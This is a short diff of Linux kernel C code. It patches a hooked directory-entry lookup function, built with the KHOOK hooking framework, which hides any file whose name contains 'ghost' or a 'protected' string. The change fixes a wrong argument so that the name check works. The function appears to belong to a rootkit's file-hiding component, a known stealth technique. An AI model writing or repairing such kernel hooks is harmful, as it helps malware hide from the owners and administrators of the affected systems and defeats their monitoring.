@@ -190,7 +190,7 @@ struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
 #endif
 {
 	struct dentry *found = NULL;
-	if (!strstr(name->name, "ghost")|| !strstr(name,protected))
+	if (!strstr(name->name, "ghost")|| !strstr(name->name,protected))
 		found = KHOOK_ORIGIN(__d_lookup, parent, name);
 	return found;
 }
